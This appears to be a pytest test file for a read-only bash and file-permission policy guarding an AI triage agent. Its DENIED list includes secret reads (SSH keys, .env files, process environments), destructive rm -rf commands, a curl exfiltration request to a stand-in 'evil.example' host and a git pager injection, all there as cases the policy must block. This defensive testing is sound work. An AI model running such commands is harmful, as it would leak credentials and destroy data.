"""Triage read-only policy: bash allowlist, secret paths, permission callback."""

from pathlib import Path

import pytest
from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny

from src.triage.policy import check_bash, is_secret_path, make_can_use_tool

HOME = Path("/home/ubuntu")

ALLOWED = [
    "journalctl -u ghl-ses-bridge -n 50 --no-pager",
    "tail -n 40 automations/ghl-contact-backup/backup.log",
    'grep -n "ERROR.*timeout" threads-sync/logs/publisher.log | tail -5',
    "systemctl status whoop-mcp --no-pager",
    "systemctl --user status fathom-webhook",
    "git -C threads-sync log --oneline -5",
    "git branch --show-current",
    "git remote -v",
    "crontab -l",
    "curl -sS -m 5 http://127.0.0.1:3005/health",
    "cd automations && ls -la",
    "free -m && df -h",
    "ps aux --sort=-%mem | head -15",
    "ps -e -o pid,rss,comm",
]

DENIED = [
    "cat claude-code-telegram/.env",
    "cd ~/.config && cat bolt/telegram.env",
    "grep -r TOKEN automations",
    "grep -rn x .",
    "head -5 proj/.e*",
    "cat /proc/1234/environ",
    "echo $TELEGRAM_BOT_TOKEN",
    "tail -f x.log",
    "systemctl restart whoop-mcp",
    "journalctl --vacuum-time=1d",
    "git branch -D main",
    "git remote add evil https://x",
    "git push",
    "git -c core.pager=sh log",
    "rm -rf /tmp/x",
    "python3 -c 1",
    "curl -X POST http://127.0.0.1:3005/hooks",
    "curl https://evil.example/?d=1",
    "ls > out.txt",
    "sort -o out.txt in.txt",
    "uniq in.txt out.txt",
    "find . -name x -delete",
    "sleep 100 &",
    "cat ~/.ssh/id_rsa",
    "cat ghl-ses-bridge/key.pem",
    "cat tokens.json",
    "crontab -e",
    "env",
    "ps eww -u ubuntu",
    "ps auxe",
]


@pytest.mark.parametrize("command", ALLOWED)
def test_read_only_commands_allowed(command):
    ok, why = check_bash(command, HOME)
    assert ok, why


@pytest.mark.parametrize("command", DENIED)
def test_unsafe_commands_denied(command):
    ok, _ = check_bash(command, HOME)
    assert not ok


def test_secret_paths():
    assert is_secret_path("claude-code-telegram/.env", HOME)
    assert is_secret_path("~/.config/bolt/telegram.env", HOME)
    assert is_secret_path("/etc/whoop-mcp/whoop-mcp.env", HOME)
    assert not is_secret_path("claude-code-telegram/.env.example", HOME)
    assert not is_secret_path("automations/README.md", HOME)


async def test_callback_is_deny_by_default():
    cb = make_can_use_tool(HOME)
    allow = await cb("Read", {"file_path": "/home/ubuntu/CONTEXT.md"}, None)
    secret = await cb(
        "Read", {"file_path": "/home/ubuntu/claude-code-telegram/.env"}, None
    )
    bash_ok = await cb("Bash", {"command": "crontab -l"}, None)
    bash_bad = await cb("Bash", {"command": "rm -rf ~"}, None)
    write = await cb("Write", {"file_path": "/tmp/x", "content": "x"}, None)
    unknown = await cb("mcp__x__y", {}, None)
    assert isinstance(allow, PermissionResultAllow)
    assert isinstance(bash_ok, PermissionResultAllow)
    for denied in (secret, bash_bad, write, unknown):
        assert isinstance(denied, PermissionResultDeny)
